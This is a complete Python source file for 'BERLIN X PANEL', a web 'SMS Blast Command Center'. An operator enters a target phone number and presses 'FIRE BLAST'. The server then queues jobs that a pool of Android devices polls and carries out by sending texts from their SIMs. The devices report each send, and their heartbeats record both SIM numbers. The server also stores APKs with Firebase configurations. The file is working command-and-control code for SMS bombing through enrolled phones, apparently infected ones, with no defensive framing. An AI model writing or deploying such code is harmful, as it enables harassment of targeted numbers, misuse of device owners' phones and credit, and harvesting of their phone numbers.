#!/usr/bin/env python3
"""
BERLIN X PANEL — Python backend + static server.
Advanced SMS Blast Command Center.
"""
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import hashlib, json, os, secrets, sqlite3, time

ROOT = Path(__file__).resolve().parent
DATA_DIR = Path(os.environ.get("DATA_DIR", str(ROOT / "data"))).expanduser()
APK_DIR = DATA_DIR / "apks"
DB_PATH = DATA_DIR / "panel.db"

HOST = os.environ.get("HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "10000"))
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
MAX_APK_MB = max(1, int(os.environ.get("MAX_APK_MB", "150")))
MAX_APK_BYTES = MAX_APK_MB * 1024 * 1024
SESSION_TTL = 12 * 60 * 60

DATA_DIR.mkdir(parents=True, exist_ok=True)
APK_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════
# LIVE COMMAND CENTER UI
# ═══════════════════════════════════════════════════════════
def _esc(s):
    if s is None or s == "": return "—"
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))

def render_devices_html(devices):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SMS Blast Command Center</title>
<style>
  *{{box-sizing:border-box;}}
  body{{margin:0;padding:2rem;background:#080808;color:#e0e0e0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;}}
  .container{{max-width:1200px;margin:0 auto;}}
  .header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;}}
  h1{{font-size:1.8rem;margin:0;color:#ff4500;letter-spacing:-.02em;text-shadow:0 0 10px rgba(255,69,0,0.3);}}
  .card{{background:#111;border:1px solid #333;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;box-shadow:0 4px 20px rgba(0,0,0,0.5);}}
  
  .blast-form{{display:flex;gap:1rem;align-items:center;}}
  .blast-form input{{flex:1;padding:1rem;background:#000;border:1px solid #444;border-radius:8px;
    color:#fff;font-size:1.1rem;outline:none;transition:border .2s;}}
  .blast-form input:focus{{border-color:#ff4500;}}
  .blast-btn{{padding:1rem 2rem;background:#ff4500;color:#fff;border:0;border-radius:8px;
    font-size:1.1rem;font-weight:bold;cursor:pointer;transition:all .2s;
    box-shadow:0 0 15px rgba(255,69,0,0.4);}}
  .blast-btn:hover{{background:#ff5722;transform:scale(1.02);}}
  .blast-btn:disabled{{background:#555;box-shadow:none;cursor:not-allowed;transform:none;}}

  .grid{{display:grid;grid-template-columns:1fr 350px;gap:1.5rem;}}
  .terminal{{background:#000;border:1px solid #333;border-radius:8px;padding:1rem;
    font-family:monospace;height:400px;overflow-y:auto;font-size:0.9rem;line-height:1.5;}}
  .log-line{{margin-bottom:0.4rem;border-bottom:1px solid #111;padding-bottom:0.4rem;}}
  .log-time{{color:#666;margin-right:10px;}}
  .log-success{{color:#00ff00;}}
  .log-info{{color:#00aaff;}}
  
  .stats-box{{display:flex;flex-direction:column;gap:1rem;}}
  .stat{{background:#1a1a1a;padding:1rem;border-radius:8px;border-left:4px solid #ff4500;}}
  .stat-title{{font-size:0.8rem;color:#888;text-transform:uppercase;letter-spacing:0.05em;}}
  .stat-value{{font-size:2rem;font-weight:bold;color:#fff;margin-top:0.5rem;font-family:monospace;}}

  table{{width:100%;border-collapse:collapse;margin-top:1rem;}}
  th,td{{padding:.75rem;text-align:left;border-bottom:1px solid #222;font-size:.85rem;}}
  th{{color:#888;font-weight:normal;}}
  .dot{{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px;}}
  .dot.on{{background:#00ff00;box-shadow:0 0 8px #00ff00;}}
  .dot.off{{background:#333;}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>⚡ SMS Blast Command Center</h1>
    <div style="font-size:0.9rem;color:#888;">Devices: <span id="devCount" style="color:#fff;font-weight:bold;">{len(devices)}</span></div>
  </div>

  <div class="card">
    <div class="blast-form">
      <input type="text" id="targetNum" placeholder="Enter Target Number (e.g. +919607429190)">
      <button class="blast-btn" id="fireBtn" onclick="fireBlast()">🚀 FIRE BLAST</button>
    </div>
    <div id="msgStatus" style="margin-top:1rem; font-size:0.9rem; color:#00ff00; display:none;"></div>
  </div>

  <div class="grid">
    <div class="card" style="padding:1rem;">
      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Terminal</h3>
      <div class="terminal" id="terminal">
        <div class="log-line"><span class="log-info">[SYSTEM]</span> Waiting for blast command...</div>
      </div>
    </div>

    <div class="card" style="padding:1rem;">
      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Stats</h3>
      <div class="stats-box">
        <div class="stat">
          <div class="stat-title">Total SMS Sent</div>
          <div class="stat-value" id="totalSent">0</div>
        </div>
        <div class="stat">
          <div class="stat-title">Status</div>
          <div class="stat-value" id="blastStatus" style="font-size:1.2rem;color:#888;">IDLE</div>
        </div>
      </div>
    </div>
  </div>

  <div class="card" style="margin-top:1.5rem;padding:1rem;">
    <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Active Device Pool</h3>
    <table>
      <thead><tr><th>Device ID</th><th>Status</th><th>SIM 1</th><th>SIM 2</th></tr></thead>
      <tbody id="devTable"></tbody>
    </table>
  </div>
</div>

<script>
let isPolling = false;
const initialDevices = {json.dumps(devices)};
function renderDevices(devs) {{
  const tb = document.getElementById('devTable');
  document.getElementById('devCount').textContent = devs.length;
  if(!devs.length) {{
    tb.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#666;">No devices connected yet.</td></tr>';
    return;
  }}
  tb.innerHTML = devs.map(d => `
    <tr>
      <td style="font-family:monospace;color:#ffa500;">${{d.device_id.slice(-6).toUpperCase()}}</td>
      <td><span class="dot ${{d.online ? 'on' : 'off'}}"></span> ${{d.online ? 'Online' : 'Offline'}}</td>
      <td>${{d.sim1_number || '—'}}</td>
      <td>${{d.sim2_number || '—'}}</td>
    </tr>
  `).join('');
}}
renderDevices(initialDevices);

function log(msg, type='info') {{
  const term = document.getElementById('terminal');
  const time = new Date().toLocaleTimeString();
  term.innerHTML += `<div class="log-line"><span class="log-time">[${{time}}]</span> <span class="log-${{type}}">${{msg}}</span></div>`;
  term.scrollTop = term.scrollHeight;
}}

async function fireBlast() {{
  const num = document.getElementById('targetNum').value.trim();
  if(!num) return alert('Please enter a target number');
  
  const btn = document.getElementById('fireBtn');
  btn.disabled = true;
  btn.textContent = 'Firing...';
  
  try {{
    const r = await fetch('/api/sms-job', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{ target: num }})
    }});
    const d = await r.json();
    
    if(d.ok) {{
      log(`Blast initiated for target: ${{num}}`, 'success');
      document.getElementById('blastStatus').textContent = 'RUNNING';
      document.getElementById('blastStatus').style.color = '#00ff00';
      startPolling();
    }} else {{
      alert('Error: ' + d.error);
      btn.disabled = false;
      btn.textContent = '🚀 FIRE BLAST';
    }}
  }} catch(e) {{
    alert('Network error');
    btn.disabled = false;
    btn.textContent = '🚀 FIRE BLAST';
  }}
}}

function startPolling() {{
  if(isPolling) return;
  isPolling = true;
  
  setInterval(async () => {{
    try {{
      const r = await fetch('/api/sms-live');
      const d = await r.json();
      
      if(d.ok) {{
        document.getElementById('totalSent').textContent = d.total_sent;
        if(d.logs && d.logs.length > 0) {{
          const term = document.getElementById('terminal');
          if(d.logs.length > term.children.length - 1) {{
            term.innerHTML = '<div class="log-line"><span class="log-info">[SYSTEM]</span> Terminal active...</div>';
            d.logs.forEach(l => {{
               const time = new Date(l.time * 1000).toLocaleTimeString();
               term.innerHTML += `<div class="log-line"><span class="log-time">[${{time}}]</span> <span class="log-success">${{l.text}}</span></div>`;
            }});
            term.scrollTop = term.scrollHeight;
          }}
        }}
      }}
    }} catch(e) {{ console.error(e); }}
  }}, 2000);
}}
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════
def get_db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("""CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, owner_name TEXT, owner_email TEXT, firebase_project_id TEXT, firebase_database_url TEXT, firebase_auth_domain TEXT, firebase_storage_bucket TEXT, firebase_messaging_sender_id TEXT, firebase_app_id TEXT, firebase_config_json TEXT, apk_original_name TEXT, apk_stored_name TEXT, apk_size INTEGER DEFAULT 0, apk_sha256 TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')""")
    con.execute("""CREATE TABLE IF NOT EXISTS devices (device_id TEXT PRIMARY KEY, number TEXT, sim1_number TEXT, sim2_number TEXT, active_sim INTEGER DEFAULT 1, firebase_url TEXT, last_seen TEXT, online INTEGER DEFAULT 0)""")
    con.execute("""CREATE TABLE IF NOT EXISTS sms_jobs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_number TEXT NOT NULL, status TEXT DEFAULT 'pending', created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
    con.execute("""CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, job_id INTEGER, device_id TEXT, sim_slot INTEGER, log_text TEXT, created_at REAL)""")
    con.commit()
    return con

get_db().close()
SESSIONS = {}

def json_out(handler, payload, code=200, extra=None):
    data = json.dumps(payload, ensure_ascii=False).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    if extra:
        for k, v in extra.items(): handler.send_header(k, v)
    handler.end_headers()
    handler.wfile.write(data)

def html_out(handler, html_text, code=200):
    data = html_text.encode("utf-8")
    handler.send_response(code)
    handler.send_header("Content-Type", "text/html; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    handler.end_headers()
    handler.wfile.write(data)

def token_from_cookie(headers):
    for part in headers.get("Cookie", "").split(";"):
        part = part.strip()
        if part.startswith("admin_session="): return part.split("=", 1)[1]
    return None

def is_admin(headers):
    token = token_from_cookie(headers)
    return bool(token and token in SESSIONS and SESSIONS[token] > time.time())

def require_admin(handler):
    if not is_admin(handler.headers):
        json_out(handler, {"ok": False, "error": "Admin authentication required."}, 401)
        return False
    return True

def read_json(handler, max_bytes=100_000):
    try: length = int(handler.headers.get("Content-Length", "0"))
    except ValueError: return None, "Invalid Content-Length."
    if length > max_bytes: return None, "Request too large."
    try: return json.loads(handler.rfile.read(length) or b"{}"), None
    except Exception: return None, "Invalid JSON."

def field(obj, name, limit): return str(obj.get(name, "") or "").strip()[:limit]

class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def end_headers(self):
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        super().end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/health":
            return json_out(self, {"ok": True, "service": "berlin-x-panel"})

        if path == "/admin":
            self.path = "/admin.html"
            return super().do_GET()

        if path == "/api/devices":
            if not require_admin(self): return
            con = get_db()
            con.execute("UPDATE devices SET online=0 WHERE last_seen < datetime('now', '-60 seconds')")
            con.commit()
            rows = con.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
            con.close()
            device_list = [dict(r) for r in rows]

            accept = self.headers.get("Accept", "")
            if "text/html" in accept:
                return html_out(self, render_devices_html(device_list))
            return json_out(self, {"ok": True, "devices": device_list})

        if path == "/api/device/sms-job":
            con = get_db()
            job = con.execute("SELECT * FROM sms_jobs WHERE status = 'pending' ORDER BY id DESC LIMIT 1").fetchone()
            con.close()
            if job: return json_out(self, {"ok": True, "job": dict(job)})
            return json_out(self, {"ok": True, "job": None})

        if path == "/api/sms-live":
            con = get_db()
            total = con.execute("SELECT COUNT(*) FROM sms_logs").fetchone()[0]
            logs = con.execute("SELECT * FROM sms_logs ORDER BY id DESC LIMIT 50").fetchall()
            con.close()
            log_list = [{"time": r["created_at"], "text": r["log_text"]} for r in logs][::-1]
            return json_out(self, {"ok": True, "total_sent": total, "logs": log_list})

        if path.startswith("/api/apk/"):
            if not require_admin(self): return
            try: app_id = int(path.rsplit("/", 1)[1])
            except ValueError: return json_out(self, {"ok": False, "error": "Invalid id."}, 400)
            con = get_db()
            row = con.execute("SELECT * FROM apps WHERE id=?", (app_id,)).fetchone()
            con.close()
            if not row or not row["apk_stored_name"]: return json_out(self, {"ok": False, "error": "APK not found."}, 404)
            f = APK_DIR / row["apk_stored_name"]
            if not f.is_file(): return json_out(self, {"ok": False, "error": "APK file missing."}, 404)
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.android.package-archive")
            self.send_header("Content-Length", str(f.stat().st_size))
            self.send_header("Content-Disposition", f'attachment; filename="{row["apk_original_name"]}"')
            self.end_headers()
            with f.open("rb") as src:
                while chunk := src.read(1024 * 1024): self.wfile.write(chunk)
            return

        return super().do_GET()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/admin/login":
            body, err = read_json(self, 16_384)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            if not ADMIN_PASSWORD: return json_out(self, {"ok": False, "error": "ADMIN_PASSWORD not set."}, 503)
            if body.get("username") == ADMIN_USER and body.get("password") == ADMIN_PASSWORD:
                token = secrets.token_urlsafe(36)
                SESSIONS[token] = time.time() + SESSION_TTL
                return json_out(self, {"ok": True}, 200, {"Set-Cookie": f"admin_session={token}; Path=/; Max-Age={SESSION_TTL}"})
            return json_out(self, {"ok": False, "error": "Invalid credentials."}, 401)

        if path == "/api/sms-job":
            if not require_admin(self): return
            body, err = read_json(self)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            target = field(body, "target", 20)
            if not target: return json_out(self, {"ok": False, "error": "Target number required."}, 400)

            con = get_db()
            con.execute("UPDATE sms_jobs SET status='completed' WHERE status='pending'")
            cur = con.execute("INSERT INTO sms_jobs (target_number) VALUES (?)", (target,))
            con.commit()
            job_id = cur.lastrowid
            con.close()
            return json_out(self, {"ok": True, "job_id": job_id}, 201)

        if path == "/api/device/heartbeat":
            body, err = read_json(self)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            device_id = field(body, "device_id", 120)
            if not device_id: return json_out(self, {"ok": False, "error": "device_id required"}, 400)
            
            sim1 = field(body, "sim1_number", 30)
            sim2 = field(body, "sim2_number", 30)
            now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            
            con = get_db()
            con.execute("""
              INSERT INTO devices (device_id, number, sim1_number, sim2_number, last_seen, online)
              VALUES (?, ?, ?, ?, ?, 1)
              ON CONFLICT(device_id) DO UPDATE SET
                number=excluded.number, sim1_number=excluded.sim1_number, sim2_number=excluded.sim2_number,
                last_seen=excluded.last_seen, online=1
            """, (device_id, sim1 or sim2, sim1, sim2, now_iso))
            con.commit(); con.close()
            return json_out(self, {"ok": True})

        if path == "/api/device/sms-report":
            body, err = read_json(self)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            job_id = body.get("job_id")
            device_id = field(body, "device_id", 120)
            sim_slot = body.get("sim_slot", 1)
            
            last6 = device_id[-6:].upper() if device_id else "UNKNOWN"
            log_text = f"Device {last6} sent SMS from SIM {sim_slot}"
            
            con = get_db()
            con.execute("INSERT INTO sms_logs (job_id, device_id, sim_slot, log_text, created_at) VALUES (?, ?, ?, ?, ?)",
                        (job_id, device_id, sim_slot, log_text, time.time()))
            con.commit(); con.close()
            return json_out(self, {"ok": True})

        return json_out(self, {"ok": False, "error": "Not found."}, 404)

if __name__ == "__main__":
    print(f"⚡ SMS COMMAND CENTER running at http://{HOST}:{PORT}")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
